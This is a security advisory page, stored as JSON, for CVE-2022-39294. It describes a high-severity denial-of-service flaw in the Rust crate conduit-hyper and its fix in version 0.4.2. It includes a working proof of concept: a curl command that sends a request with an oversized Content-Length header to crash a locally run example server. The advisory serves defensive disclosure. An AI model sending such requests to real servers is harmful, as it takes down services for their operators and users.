{"hash":"afba0c6ee94814b4ad1f8d12fa653707aace3354","data":{"post":{"title":"conduit-hyper missing request size limit DoS","path":"/vulnerabilities/conduit-hyper-dos/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>A missing request size limit for HTTP requests in conduit-hyper can allow network attackers to perform denial of service</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://crates.io/crates/conduit-hyper\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">conduit-hyper</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>[0.2.0-alpha.3, 0.4.2), fixed in 0.4.2</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>conduit-hyper would not, by default, set a limit for the size of the request body. That meant if a malicious peer would send a request with a very large <code>Content-Length</code> header (even if the body itself is not very large), the Rust allocator would panic (due to a failed allocation) and the process would crash.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-bash\">git clone https://github.com/conduit-rust/conduit-hyper\n\ncd conduit-hyper &#x26;&#x26; cargo run --example server\n\ncurl -v -X PUT \"http://127.0.0.1:12345/\" --data `python3 -c\n\"import sys; sys.stdout.write('a'*10000)\"` -H\n\"Content-Length: 11111111111111111111\"\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are provided for this vulnerability.</p>\n<p>In order to fully fix this vulnerability, we recommend upgrading conduit-hyper to version 0.4.2</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/conduit-rust/conduit-hyper/security/advisories/GHSA-9398-5ghf-7pr6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GHSA</a></p>\n","description":"CVE-2022-39294 High severity. Missing limit checks in conduit-hyper leads to denial of service","date_published":"2022-11-01","xray_id":"","vul_id":"CVE-2022-39294","severity":"high","discovered_by":"Ori Hollander","last_updated":"2022-11-01","cvss":7.5}},"context":{}}